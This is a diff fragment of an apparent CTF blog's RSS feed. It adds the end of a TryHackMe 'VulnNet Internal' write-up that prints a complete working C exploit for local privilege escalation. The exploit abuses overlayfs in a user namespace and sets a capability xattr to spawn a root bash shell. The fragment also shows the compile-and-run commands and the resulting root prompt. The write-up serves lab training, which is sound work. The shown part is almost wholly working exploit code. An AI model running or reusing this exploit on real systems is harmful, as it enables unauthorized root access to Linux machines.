+            err(1, &amp;quot;read %s&amp;quot;, src);
+        }
+
+        char *p = buf;
+        while (rd &amp;gt; 0) {
+            wr = write(fo, p, rd);
+            if (wr == -1) {
+                if (errno == EINTR)
+                    continue;
+                err(1, &amp;quot;write %s&amp;quot;, dst);
+            }
+            p += wr;
+            rd -= wr;
+        }
+    }
+
+    close(fi);
+    close(fo);
+}
+
+static int exploit()
+{
+    char buf[4096];
+
+    sprintf(buf, &amp;quot;rm -rf &#39;%s/&#39;&amp;quot;, DIR_BASE);
+    system(buf);
+
+    xmkdir(DIR_BASE, 0777);
+    xmkdir(DIR_WORK,  0777);
+    xmkdir(DIR_LOWER, 0777);
+    xmkdir(DIR_UPPER, 0777);
+    xmkdir(DIR_MERGE, 0777);
+
+    uid_t uid = getuid();
+    gid_t gid = getgid();
+
+    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
+        err(1, &amp;quot;unshare&amp;quot;);
+
+    xwritefile(&amp;quot;/proc/self/setgroups&amp;quot;, &amp;quot;deny&amp;quot;);
+
+    sprintf(buf, &amp;quot;0 %d 1&amp;quot;, uid);
+    xwritefile(&amp;quot;/proc/self/uid_map&amp;quot;, buf);
+
+    sprintf(buf, &amp;quot;0 %d 1&amp;quot;, gid);
+    xwritefile(&amp;quot;/proc/self/gid_map&amp;quot;, buf);
+
+    sprintf(buf, &amp;quot;lowerdir=%s,upperdir=%s,workdir=%s&amp;quot;, DIR_LOWER, DIR_UPPER, DIR_WORK);
+    if (mount(&amp;quot;overlay&amp;quot;, DIR_MERGE, &amp;quot;overlay&amp;quot;, 0, buf) == -1)
+        err(1, &amp;quot;mount %s&amp;quot;, DIR_MERGE);
+
+    // all+ep
+    char cap[] = &amp;quot;\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00&amp;quot;;
+
+    xcopyfile(&amp;quot;/proc/self/exe&amp;quot;, BIN_MERGE, 0777);
+    if (setxattr(BIN_MERGE, &amp;quot;security.capability&amp;quot;, cap, sizeof(cap) - 1, 0) == -1)
+        err(1, &amp;quot;setxattr %s&amp;quot;, BIN_MERGE);
+
+    return 0;
+}
+
+int main(int argc, char *argv[])
+{
+    if (strstr(argv[0], &amp;quot;magic&amp;quot;) || (argc &amp;gt; 1 &amp;amp;&amp;amp; !strcmp(argv[1], &amp;quot;shell&amp;quot;))) {
+        setuid(0);
+        setgid(0);
+        execl(&amp;quot;/bin/bash&amp;quot;, &amp;quot;/bin/bash&amp;quot;, &amp;quot;--norc&amp;quot;, &amp;quot;--noprofile&amp;quot;, &amp;quot;-i&amp;quot;, NULL);
+        err(1, &amp;quot;execl /bin/bash&amp;quot;);
+    }
+
+    pid_t child = fork();
+    if (child == -1)
+        err(1, &amp;quot;fork&amp;quot;);
+
+    if (child == 0) {
+        _exit(exploit());
+    } else {
+        waitpid(child, NULL, 0);
+    }
+
+    execl(BIN_UPPER, BIN_UPPER, &amp;quot;shell&amp;quot;, NULL);
+    err(1, &amp;quot;execl %s&amp;quot;, BIN_UPPER);
+}
+EOF
+sys-internal@vulnnet-internal:~$ gcc xpl.c 
+sys-internal@vulnnet-internal:~$ ./a.out 
+bash-4.4# 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are done!&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>TryHackMe: Mustacchio Writeup</title>
         <link>/p/tryhackme-mustacchio-writeup/</link>
         <pubDate>Wed, 16 Jun 2021 00:00:00 +0000</pubDate>
